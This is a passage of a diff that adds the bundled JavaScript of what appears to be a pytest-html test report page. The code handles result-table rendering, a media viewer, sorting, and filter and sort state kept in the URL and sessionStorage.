+    renderStatic()
+    redraw()
+    bindEvents()
+}
+
+init()
+
+},{"./datamanager.js":1,"./filter.js":3,"./main.js":5,"./sort.js":7}],5:[function(require,module,exports){
+const { dom, find, findAll } = require('./dom.js')
+const { manager } = require('./datamanager.js')
+const { doSort } = require('./sort.js')
+const { doFilter } = require('./filter.js')
+const {
+    getVisible,
+    getCollapsedIds,
+    setCollapsedIds,
+    getSort,
+    getSortDirection,
+    possibleFilters,
+} = require('./storage.js')
+
+const removeChildren = (node) => {
+    while (node.firstChild) {
+        node.removeChild(node.firstChild)
+    }
+}
+
+const renderStatic = () => {
+    const renderEnvironmentTable = () => {
+        const environment = manager.environment
+        const rows = Object.keys(environment).map((key) => dom.getStaticRow(key, environment[key]))
+        const table = document.getElementById('environment')
+        removeChildren(table)
+        rows.forEach((row) => table.appendChild(row))
+    }
+    renderEnvironmentTable()
+}
+
+const addItemToggleListener = (elem) => {
+    elem.addEventListener('click', ({ target }) => {
+        const id = target.parentElement.dataset.id
+        manager.toggleCollapsedItem(id)
+
+        const collapsedIds = getCollapsedIds()
+        if (collapsedIds.includes(id)) {
+            const updated = collapsedIds.filter((item) => item !== id)
+            setCollapsedIds(updated)
+        } else {
+            collapsedIds.push(id)
+            setCollapsedIds(collapsedIds)
+        }
+        redraw()
+    })
+}
+
+const renderContent = (tests) => {
+    const sortAttr = getSort(manager.initialSort)
+    const sortAsc = JSON.parse(getSortDirection())
+    const rows = tests.map(dom.getResultTBody)
+    const table = document.getElementById('results-table')
+    const tableHeader = document.getElementById('results-table-head')
+
+    const newTable = document.createElement('table')
+    newTable.id = 'results-table'
+
+    // remove all sorting classes and set the relevant
+    findAll('.sortable', tableHeader).forEach((elem) => elem.classList.remove('asc', 'desc'))
+    tableHeader.querySelector(`.sortable[data-column-type="${sortAttr}"]`)?.classList.add(sortAsc ? 'desc' : 'asc')
+    newTable.appendChild(tableHeader)
+
+    if (!rows.length) {
+        const emptyTable = document.getElementById('template_results-table__body--empty').content.cloneNode(true)
+        newTable.appendChild(emptyTable)
+    } else {
+        rows.forEach((row) => {
+            if (!!row) {
+                findAll('.collapsible td:not(.col-links', row).forEach(addItemToggleListener)
+                find('.logexpander', row).addEventListener('click',
+                    (evt) => evt.target.parentNode.classList.toggle('expanded'),
+                )
+                newTable.appendChild(row)
+            }
+        })
+    }
+
+    table.replaceWith(newTable)
+}
+
+const renderDerived = () => {
+    const currentFilter = getVisible()
+    possibleFilters.forEach((result) => {
+        const input = document.querySelector(`input[data-test-result="${result}"]`)
+        input.checked = currentFilter.includes(result)
+    })
+}
+
+const bindEvents = () => {
+    const filterColumn = (evt) => {
+        const { target: element } = evt
+        const { testResult } = element.dataset
+
+        doFilter(testResult, element.checked)
+        const collapsedIds = getCollapsedIds()
+        const updated = manager.renderData.tests.map((test) => {
+            return {
+                ...test,
+                collapsed: collapsedIds.includes(test.id),
+            }
+        })
+        manager.setRender(updated)
+        redraw()
+    }
+
+    const header = document.getElementById('environment-header')
+    header.addEventListener('click', () => {
+        const table = document.getElementById('environment')
+        table.classList.toggle('hidden')
+        header.classList.toggle('collapsed')
+    })
+
+    findAll('input[name="filter_checkbox"]').forEach((elem) => {
+        elem.addEventListener('click', filterColumn)
+    })
+
+    findAll('.sortable').forEach((elem) => {
+        elem.addEventListener('click', (evt) => {
+            const { target: element } = evt
+            const { columnType } = element.dataset
+            doSort(columnType)
+            redraw()
+        })
+    })
+
+    document.getElementById('show_all_details').addEventListener('click', () => {
+        manager.allCollapsed = false
+        setCollapsedIds([])
+        redraw()
+    })
+    document.getElementById('hide_all_details').addEventListener('click', () => {
+        manager.allCollapsed = true
+        const allIds = manager.renderData.tests.map((test) => test.id)
+        setCollapsedIds(allIds)
+        redraw()
+    })
+}
+
+const redraw = () => {
+    const { testSubset } = manager
+
+    renderContent(testSubset)
+    renderDerived()
+}
+
+module.exports = {
+    redraw,
+    bindEvents,
+    renderStatic,
+}
+
+},{"./datamanager.js":1,"./dom.js":2,"./filter.js":3,"./sort.js":7,"./storage.js":8}],6:[function(require,module,exports){
+class MediaViewer {
+    constructor(assets) {
+        this.assets = assets
+        this.index = 0
+    }
+
+    nextActive() {
+        this.index = this.index === this.assets.length - 1 ? 0 : this.index + 1
+        return [this.activeFile, this.index]
+    }
+
+    prevActive() {
+        this.index = this.index === 0 ? this.assets.length - 1 : this.index -1
+        return [this.activeFile, this.index]
+    }
+
+    get currentIndex() {
+        return this.index
+    }
+
+    get activeFile() {
+        return this.assets[this.index]
+    }
+}
+
+
+const setup = (resultBody, assets) => {
+    if (!assets.length) {
+        resultBody.querySelector('.media').classList.add('hidden')
+        return
+    }
+
+    const mediaViewer = new MediaViewer(assets)
+    const container = resultBody.querySelector('.media-container')
+    const leftArrow = resultBody.querySelector('.media-container__nav--left')
+    const rightArrow = resultBody.querySelector('.media-container__nav--right')
+    const mediaName = resultBody.querySelector('.media__name')
+    const counter = resultBody.querySelector('.media__counter')
+    const imageEl = resultBody.querySelector('img')
+    const sourceEl = resultBody.querySelector('source')
+    const videoEl = resultBody.querySelector('video')
+
+    const setImg = (media, index) => {
+        if (media?.format_type === 'image') {
+            imageEl.src = media.path
+
+            imageEl.classList.remove('hidden')
+            videoEl.classList.add('hidden')
+        } else if (media?.format_type === 'video') {
+            sourceEl.src = media.path
+
+            videoEl.classList.remove('hidden')
+            imageEl.classList.add('hidden')
+        }
+
+        mediaName.innerText = media?.name
+        counter.innerText = `${index + 1} / ${assets.length}`
+    }
+    setImg(mediaViewer.activeFile, mediaViewer.currentIndex)
+
+    const moveLeft = () => {
+        const [media, index] = mediaViewer.prevActive()
+        setImg(media, index)
+    }
+    const doRight = () => {
+        const [media, index] = mediaViewer.nextActive()
+        setImg(media, index)
+    }
+    const openImg = () => {
+        window.open(mediaViewer.activeFile.path, '_blank')
+    }
+    if (assets.length === 1) {
+        container.classList.add('media-container--fullscreen')
+    } else {
+        leftArrow.addEventListener('click', moveLeft)
+        rightArrow.addEventListener('click', doRight)
+    }
+    imageEl.addEventListener('click', openImg)
+}
+
+module.exports = {
+    setup,
+}
+
+},{}],7:[function(require,module,exports){
+const { manager } = require('./datamanager.js')
+const storageModule = require('./storage.js')
+
+const genericSort = (list, key, ascending, customOrder) => {
+    let sorted
+    if (customOrder) {
+        sorted = list.sort((a, b) => {
+            const aValue = a.result.toLowerCase()
+            const bValue = b.result.toLowerCase()
+
+            const aIndex = customOrder.findIndex((item) => item.toLowerCase() === aValue)
+            const bIndex = customOrder.findIndex((item) => item.toLowerCase() === bValue)
+
+            // Compare the indices to determine the sort order
+            return aIndex - bIndex
+        })
+    } else {
+        sorted = list.sort((a, b) => a[key] === b[key] ? 0 : a[key] > b[key] ? 1 : -1)
+    }
+
+    if (ascending) {
+        sorted.reverse()
+    }
+    return sorted
+}
+
+const durationSort = (list, ascending) => {
+    const parseDuration = (duration) => {
+        if (duration.includes(':')) {
+            // If it's in the format "HH:mm:ss"
+            const [hours, minutes, seconds] = duration.split(':').map(Number)
+            return (hours * 3600 + minutes * 60 + seconds) * 1000
+        } else {
+            // If it's in the format "nnn ms"
+            return parseInt(duration)
+        }
+    }
+    const sorted = list.sort((a, b) => parseDuration(a['duration']) - parseDuration(b['duration']))
+    if (ascending) {
+        sorted.reverse()
+    }
+    return sorted
+}
+
+const doInitSort = () => {
+    const type = storageModule.getSort(manager.initialSort)
+    const ascending = storageModule.getSortDirection()
+    const list = manager.testSubset
+    const initialOrder = ['Error', 'Failed', 'Rerun', 'XFailed', 'XPassed', 'Skipped', 'Passed']
+
+    storageModule.setSort(type)
+    storageModule.setSortDirection(ascending)
+
+    if (type?.toLowerCase() === 'original') {
+        manager.setRender(list)
+    } else {
+        let sortedList
+        switch (type) {
+        case 'duration':
+            sortedList = durationSort(list, ascending)
+            break
+        case 'result':
+            sortedList = genericSort(list, type, ascending, initialOrder)
+            break
+        default:
+            sortedList = genericSort(list, type, ascending)
+            break
+        }
+        manager.setRender(sortedList)
+    }
+}
+
+const doSort = (type, skipDirection) => {
+    const newSortType = storageModule.getSort(manager.initialSort) !== type
+    const currentAsc = storageModule.getSortDirection()
+    let ascending
+    if (skipDirection) {
+        ascending = currentAsc
+    } else {
+        ascending = newSortType ? false : !currentAsc
+    }
+    storageModule.setSort(type)
+    storageModule.setSortDirection(ascending)
+
+    const list = manager.testSubset
+    const sortedList = type === 'duration' ? durationSort(list, ascending) : genericSort(list, type, ascending)
+    manager.setRender(sortedList)
+}
+
+module.exports = {
+    doInitSort,
+    doSort,
+}
+
+},{"./datamanager.js":1,"./storage.js":8}],8:[function(require,module,exports){
+const possibleFilters = [
+    'passed',
+    'skipped',
+    'failed',
+    'error',
+    'xfailed',
+    'xpassed',
+    'rerun',
+]
+
+const getVisible = () => {
+    const url = new URL(window.location.href)
+    const settings = new URLSearchParams(url.search).get('visible')
+    const lower = (item) => {
+        const lowerItem = item.toLowerCase()
+        if (possibleFilters.includes(lowerItem)) {
+            return lowerItem
+        }
+        return null
+    }
+    return settings === null ?
+        possibleFilters :
+        [...new Set(settings?.split(',').map(lower).filter((item) => item))]
+}
+
+const hideCategory = (categoryToHide) => {
+    const url = new URL(window.location.href)
+    const visibleParams = new URLSearchParams(url.search).get('visible')
+    const currentVisible = visibleParams ? visibleParams.split(',') : [...possibleFilters]
+    const settings = [...new Set(currentVisible)].filter((f) => f !== categoryToHide).join(',')
+
+    url.searchParams.set('visible', settings)
+    window.history.pushState({}, null, unescape(url.href))
+}
+
+const showCategory = (categoryToShow) => {
+    if (typeof window === 'undefined') {
+        return
+    }
+    const url = new URL(window.location.href)
+    const currentVisible = new URLSearchParams(url.search).get('visible')?.split(',').filter(Boolean) ||
+        [...possibleFilters]
+    const settings = [...new Set([categoryToShow, ...currentVisible])]
+    const noFilter = possibleFilters.length === settings.length || !settings.length
+
+    noFilter ? url.searchParams.delete('visible') : url.searchParams.set('visible', settings.join(','))
+    window.history.pushState({}, null, unescape(url.href))
+}
+
+const getSort = (initialSort) => {
+    const url = new URL(window.location.href)
+    let sort = new URLSearchParams(url.search).get('sort')
+    if (!sort) {
+        sort = initialSort || 'result'
+    }
+    return sort
+}
+
+const setSort = (type) => {
+    const url = new URL(window.location.href)
+    url.searchParams.set('sort', type)
+    window.history.pushState({}, null, unescape(url.href))
+}
+
+const getCollapsedCategory = (renderCollapsed) => {
+    let categories
+    if (typeof window !== 'undefined') {
+        const url = new URL(window.location.href)
+        const collapsedItems = new URLSearchParams(url.search).get('collapsed')
+        switch (true) {
+        case !renderCollapsed && collapsedItems === null:
+            categories = ['passed']
+            break
+        case collapsedItems?.length === 0 || /^["']{2}$/.test(collapsedItems):
+            categories = []
+            break
+        case /^all$/.test(collapsedItems) || collapsedItems === null && /^all$/.test(renderCollapsed):
+            categories = [...possibleFilters]
+            break
+        default:
+            categories = collapsedItems?.split(',').map((item) => item.toLowerCase()) || renderCollapsed
+            break
+        }
+    } else {
+        categories = []
+    }
+    return categories
+}
+
+const getSortDirection = () => JSON.parse(sessionStorage.getItem('sortAsc')) || false
+const setSortDirection = (ascending) => sessionStorage.setItem('sortAsc', ascending)
+
+const getCollapsedIds = () => JSON.parse(sessionStorage.getItem('collapsedIds')) || []
+const setCollapsedIds = (list) => sessionStorage.setItem('collapsedIds', JSON.stringify(list))
+
+module.exports = {
+    getVisible,
+    hideCategory,
+    showCategory,
+    getCollapsedIds,
+    setCollapsedIds,
+    getSort,
+    setSort,
+    getSortDirection,
+    setSortDirection,
+    getCollapsedCategory,
+    possibleFilters,
+}
+
+},{}]},{},[4]);
+    </script>
+  </footer>
+  </body>
 </html>
